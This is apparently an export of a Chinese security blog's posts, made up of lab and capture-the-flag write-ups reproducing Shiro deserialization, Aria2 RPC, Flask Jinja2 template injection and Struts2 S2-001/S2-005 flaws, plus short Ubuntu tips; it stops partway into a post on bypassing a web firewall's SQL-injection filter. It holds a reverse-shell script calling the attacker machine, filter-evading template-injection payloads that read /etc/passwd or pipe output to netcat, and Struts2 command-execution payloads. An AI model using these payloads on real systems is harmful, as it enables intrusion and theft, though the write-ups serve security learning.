    <title>shiro反序列化复现</title>
    <url>/posts/135e71ec/</url>
    <content><![CDATA[<h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><blockquote>
<p>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）<br>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
</blockquote>
<p>shiro 提供了RememberMe功能，对rememberMe的cookie做了加密处理，当用户成功登录后shiro在CookieRememberMeManaer类中将cookie中rememberMe字段内容分别进行 <strong>序列化，AES加密，base64编码。</strong></p>
<p>相对的，在识别身份是会对cookie的RememberMe字段进行解密处理，解密顺序为    <strong>获取RememberMe cookie ，base64解密， AES解密， 反序列化</strong></p>
<p>所以可以构造一个恶意对象，对其序列化，AES加密，base64编码之后作为cookie的RememberMe 字段发送出去，shiro会将RememberMe进行解密并反序列化，从而造成反序列化漏洞.</p>
<br>

<br>

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>kali : 192.168.87.128</p>
<p>Ubuntu : 192.168.87.129</p>
<p><code>docker-compose up -d</code> 访问<code>192.168.87.129:8080</code></p>
<p>使用burpsuite抓包，勾选rememberme,账号密码分别为<code>admin</code>,<code>vulhub</code></p>
<p><img src="/posts/135e71ec/bp1.png"></p>
<p>提交表单后,可以看到set-cookie的remeberMe=deleteMe</p>
<br>

<p><img src="/posts/135e71ec/1.PNG"></p>
<p><img src="/posts/135e71ec/2.PNG"></p>
<p>在kali上开启监听 </p>
<p><code>nc -lvvp 6666</code></p>
<p><img src="/posts/135e71ec/3.PNG"></p>
<p><img src="/posts/135e71ec/4.PNG"></p>
<p><img src="/posts/135e71ec/shell.png"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Aria2RCE漏洞复现</title>
    <url>/posts/undefined/</url>
    <content><![CDATA[<h3 id><a href="#" class="headerlink" title></a></h3><p>Aria2 是一款命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><code>docker-compose up -d</code></p>
<p>aria2的rpc服务端口默认为6800，启动环境后访问 <code>192.168.159.128:6800</code> burpsuite抓包后发现返回为404</p>
<p>因为 rpc 通信需要使用 json 或者 xml，不太方便，所以我们可以借助第三方 UI 来和目标通信，这是一款轻量级web写入工具</p>
<p><code>http://binux.github.io/yaaw/demo/</code></p>
<p>点击右上角的设置进行信息配置</p>
<p><img src="/posts/undefined/settings.png"></p>
<br>

<p>开启一个web服务，将shell准备好，shell文件要在linux环境下去生产，因为Linux和windows下的换行符不同</p>
<p>kali ： 192.168.159.129</p>
<p>Ubuntu ： 192.168.159.128</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /bin/sh</span></span><br><span class="line">/bin/sh <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">159.129</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Python2 ：python2 -m SimpleHTTPServer 8000<br>Python3 ：python3 -m http.server 8000</p>
<p><img src="/posts/undefined/add_task.png"></p>
<p>不知道为什么，无法下载文件，之前去测试下载别的东西，也无法去下载…一直报错<code>Error: Internal server error</code></p>
<p>查了下报错原因 说是因为没有找到 Aria2 进程，但是在vulhub docker环境中已经开放了，试了几次最终还是没找到原因….后续的利用crond任务反弹shell也就没法实现了。<br>之后有时间再去复现一下吧.</p>
]]></content>
      <categories>
        <category>Aria2</category>
      </categories>
      <tags>
        <tag>Aria2</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask_ssti</title>
    <url>/posts/83c81c44/</url>
    <content><![CDATA[<h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>ssti 服务端模板注入，多存在于python的jinja2,django,tornado,mako 框架  php的tiwg,smarty框架 java框架jade velocity</p>
<p>在不正确使用模板引擎进行渲染时，会造成模板注入，会造成RCE，任意文件读取等漏洞，多出现再ctf中.</p>
<p><img src="/posts/83c81c44/ssti.png"></p>
<br>

<hr>
<h3 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h3><ul>
<li><p><code>__class__</code>         返回该对象所属的类</p>
<p>   <img src="/posts/83c81c44/1.png"></p>
</li>
<li><p><code>__base__</code>        以字符串形式返回一个类所直接继承的第一个类</p>
</li>
<li><p><code>__bases__</code>        以元组的形式返回一个类所直接继承的类</p>
</li>
<li><p><code>__mro__</code>            返回解析方法调用的顺序</p>
<p>  <img src="/posts/83c81c44/2.png"></p>
</li>
<li><p><code>__subclasses__()</code>        返回这个类的所有子类的集合</p>
<p>  <img src="/posts/83c81c44/3.png"></p>
</li>
<li><p><code>__globals__</code>    <code>function.__global__</code>  获取function所处空间下可以使用的module、方法及所有变量</p>
</li>
<li><p><code>__init__</code>        初始化类</p>
</li>
<li><p><code>__builtins__</code>     可以利用<code>__import__</code> <code>eval</code>执行命令</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure>
<br>

<p><code>&#39;&#39;.__class__.__mro__[-1]</code>为<code>&lt;class &#39;object&#39;&gt;</code></p>
<p>python中的类都是继承object的，所以要调用object类的<code>__subclasses__()</code>去得到我们想要使用的类的对象，</p>
<br>

<p>利用ssti要做的主要为两点</p>
<ul>
<li>读取文件内容</li>
<li>执行命令</li>
</ul>
<p>那只需要去寻找 os/file等关键字</p>
<p>一般都是使用object类下的 <code>&lt;class &#39;os._wrap_close&#39;&gt;</code>的<code>popen</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[:<span class="number">200</span>]):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="vulhub上的flask-ssti"><a href="#vulhub上的flask-ssti" class="headerlink" title="vulhub上的flask ssti"></a>vulhub上的flask ssti</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h4 id="关键语句"><a href="#关键语句" class="headerlink" title="关键语句"></a>关键语句</h4><p><code>t = Template(&quot;Hello &quot; + name)</code></p>
<p>利用get传参进入template，构造注入语句</p>
<h4 id="验证语句"><a href="#验证语句" class="headerlink" title="验证语句"></a>验证语句</h4><p><img src="/posts/83c81c44/ssti1.png"></p>
<p><img src="/posts/83c81c44/ssti2.png"></p>
<p><img src="/posts/83c81c44/ssti3.png"></p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><code>t = Template(&quot;Hello &quot; + &#123;&#123;defense&#125;&#125;)</code></p>
<h4 id="官方POC"><a href="#官方POC" class="headerlink" title="官方POC"></a>官方POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><code>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data) </code></p>
<hr>
<h3 id="buuoj-ssti"><a href="#buuoj-ssti" class="headerlink" title="buuoj ssti"></a>buuoj ssti</h3><p><img src="/posts/83c81c44/buuoj1.png"></p>
<p>可以判断是flask jinja2 的模板    (如果返回的是25 则是Twig模板)</p>
<p><img src="/posts/83c81c44/buuoj2.png"></p>
<p><img src="/posts/83c81c44/buuoj3.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__&#125;&#125;</code></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1]&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj4.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()&#125;&#125;</code>或者</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code>获取object的可以利用的类</p>
<p><img src="/posts/83c81c44/buuoj5.png"></p>
<p>使用脚本遍历找到利用的类</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127]&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj6.png"></p>
<p>利用<code>.__init__.__globals__</code>来找os类下的，<code>__init__</code>初始化类，然后<code>__globals__</code>全局来查找所有的方法及变量及参数</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj7.png"></p>
<p>利用<code>popen</code>去读取文件</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27dir%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj8.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27ls%27).read()&#125;&#125;</code></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[%27eval%27]("__import__(%27os%27).popen(%27ls%27).read()")&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj9.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27whoami%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj10.png"></p>
<p>看看/app下面有什么内容</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27ls%20/app%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj11.png"></p>
<p>看看server.py</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27cat%20/app/server.py%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj12.png"></p>
<p>得到flag <code>n1book&#123;eddb84d69a421a82&#125; </code></p>
<br>

<hr>
<h3 id="可能会用到的payload"><a href="#可能会用到的payload" class="headerlink" title="可能会用到的payload"></a>可能会用到的payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /app&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__imp&#x27;+&#x27;ort__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ls ./&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls | nc 127.0.0.1 1234&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60][&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__&#x27;+&#x27;glo&#x27;+&#x27;bal&#x27;+&#x27;s__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__im&#x27;+&#x27;port__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#x27;+&#x27;ad()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> 如果过滤了[]等括号  </p>
<p>  使用 <code>__gititem__</code></p>
<p><code>&#123;&#123;%27%27.__class__.__bases__[0]&#125;&#125; </code>       –&gt;      <code> &#123;&#123;%27%27.__class__.__bases__.__getitem__(0)&#125;&#125;</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_45669205/article/details/114373785">https://blog.csdn.net/weixin_45669205/article/details/114373785</a></p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p><a href="http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/">http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/</a></p>
<p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">https://www.cnblogs.com/Xy--1/p/12841941.html</a></p>
<p><a href="http://ctf.ieki.xyz/library/ssti.html">http://ctf.ieki.xyz/library/ssti.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ssti</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装pip2</title>
    <url>/posts/2a2a2884/</url>
    <content><![CDATA[<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启用 universe 源仓库</span><br><span class="line">sudo add-apt-repository universe</span><br><span class="line"></span><br><span class="line">sudo proxychains4 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py </span><br><span class="line"></span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu_apt-get安装时报错</title>
    <url>/posts/e46255d2/</url>
    <content><![CDATA[<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/lib/dpkg/</span><br><span class="line">sudo mv info/ info_bak          # 现将info文件夹更名</span><br><span class="line">sudo mkdir info                 # 再新建一个新的info文件夹</span><br><span class="line">sudo apt-get update             # 更新</span><br><span class="line">sudo apt-get -f install         # 修复</span><br><span class="line">sudo mv info/* info_bak/        # 执行完上一步操作后会在新的info文件夹下生成一些文件，现将这些文件全部移到info_bak文件夹下</span><br><span class="line">sudo rm -rf info                # 把自己新建的info文件夹删掉</span><br><span class="line">sudo mv info_bak info           # 把以前的info文件夹重新改回名</span><br></pre></td></tr></table></figure>

<br>

<p><code>Reference</code></p>
<blockquote>
</blockquote>
]]></content>
      <categories>
        <category>apt-get</category>
      </categories>
      <tags>
        <tag>apt-get</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2复现s2-005</title>
    <url>/posts/9e0365e7/</url>
    <content><![CDATA[<h3 id="S2-005复现"><a href="#S2-005复现" class="headerlink" title="S2-005复现"></a>S2-005复现</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>修复S2-003时存在绕过，S2-003对# 过滤时忽略了Unicode编码，可以使用\u0023或者八进制进行绕过</p>
<br>
####  环境准备

<p><code>docker-compose up -d</code></p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><h4 id="原始POC"><a href="#原始POC" class="headerlink" title="原始POC"></a>原始POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;\u0023_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;)(vaaa)=true</span><br><span class="line">&amp;(aaaa)((&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003d\u0023vccc&#x27;)(\u0023vccc\u003dnew java.lang.Boolean(&quot;false&quot;)))</span><br><span class="line">&amp;(asdf)((&#x27;\u0023rt.exec(&quot;calc&quot;)&#x27;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
<p>解码后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;#_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;)(vaaa)=true</span><br><span class="line">//设置allowStaticMethodAccess为true，开启后就可以执行静态方法 (vaaa)为遵循ognl语法树规则</span><br><span class="line">&amp;(aaaa)((&#x27;#context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]=#vccc&#x27;)(#vccc=new java.lang.Boolean(&quot;false&quot;)))</span><br><span class="line">//设置denyMethodExecution为false 允许ognl自定义变量</span><br><span class="line">&amp;(asdf)((&#x27;#rt.exec(&quot;calc&quot;)&#x27;)(#rt=@java.lang.Runtime@getRuntime()))=1</span><br><span class="line">//执行 calc 系统命令</span><br></pre></td></tr></table></figure>
<p>whoami POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(%27%5c43_memberAccess.allowStaticMethodAccess%27)(a)=true</span><br><span class="line">&amp;(b)((%27%5c43context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5c75false%27)(b))</span><br><span class="line">&amp;(%27%5c43c%27)((%27%5c43_memberAccess.excludeProperties%5c75@java.util.Collections@EMPTY_SET%27)(c))</span><br><span class="line">&amp;(g)((%27%5c43mycmd%5c75%5c%27whoami%5c%27%27)(d))</span><br><span class="line">&amp;(h)((%27%5c43myret%5c75@java.lang.Runtime@getRuntime().exec(%5c43mycmd)%27)(d))&amp;(i)((%27%5c43mydat%5c75new%5c40java.io.DataInputStream(%5c43myret.getInputStream())%27)(d))&amp;(j)((%27%5c43myres%5c75new%5c40byte[51020]%27)(d))&amp;(k)((%27%5c43mydat.readFully(%5c43myres)%27)(d))&amp;(l)((%27%5c43mystr%5c75new%5c40java.lang.String(%5c43myres)%27)(d))&amp;(m)((%27%5c43myout%5c75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&amp;(n)((%27%5c43myout.getWriter().println(%5c43mystr)%27)(d))</span><br></pre></td></tr></table></figure>
<h4 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h4><p><code>docker-compose down -v</code></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://b1ue.cn/archives/107.html">http://b1ue.cn/archives/107.html</a></p>
<p><a href="https://xz.aliyun.com/t/7966#toc-0">https://xz.aliyun.com/t/7966#toc-0</a></p>
<p><a href="https://blog.csdn.net/u011721501/article/details/41626959">https://blog.csdn.net/u011721501/article/details/41626959</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2复现s2-001</title>
    <url>/posts/996ea1fe/</url>
    <content><![CDATA[<h3 id="S2-001复现"><a href="#S2-001复现" class="headerlink" title="S2-001复现"></a>S2-001复现</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>用户提交表单数据验证失败后，后端会使用OGNL表达式%{value}对输入的参数进行解析,从而造成命令执行</p>
<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p><code>cd s2-001</code></p>
<p><code>docker-compose build</code></p>
<p><code>docker-compose up -d</code></p>
<p><code>docekr ps</code>查看是否启动成功</p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>访问192.168.159.128:8080</p>
<p><img src="/posts/996ea1fe/001-1.PNG"></p>
<p>输入<code>%&#123;1+23&#125;</code>得到结果为24 可以判断存在远程代码执行</p>
<p><img src="/posts/996ea1fe/001-2.PNG"></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></p>
<p>将<code>pwd</code>换成对应命令即可执行</p>
<br>

<p>获取web路径POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#req=@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line"></span><br><span class="line">#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line"></span><br><span class="line">#response.println(#req.getRealPath(&#x27;/&#x27;)),</span><br><span class="line"></span><br><span class="line">#response.flush(),</span><br><span class="line"></span><br><span class="line">#response.close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-3.PNG"></p>
<p>查看权限whoami POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e=new char[50000],</span><br><span class="line"></span><br><span class="line">#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-4.PNG"></p>
<p><code>cat /etc/passwd</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e=new char[50000],#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line"></span><br><span class="line">#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-5.PNG"></p>
<h4 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h4><p><code>docker-compose down -v</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p> <a href="https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/">https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</a></p>
<p><a href="https://xz.aliyun.com/t/2672#toc-0">https://xz.aliyun.com/t/2672#toc-0</a></p>
<p><a href="https://www.freebuf.com/vuls/246768.html">https://www.freebuf.com/vuls/246768.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo设置多个标签或分类</title>
    <url>/posts/d7c641b4/</url>
    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>安全狗4.0 sqli绕过</title>
    <url>/posts/d405928/</url>
    <content><![CDATA[<h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="/posts/d405928/1.png"></p>
<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="/posts/d405928/2.png"></p>
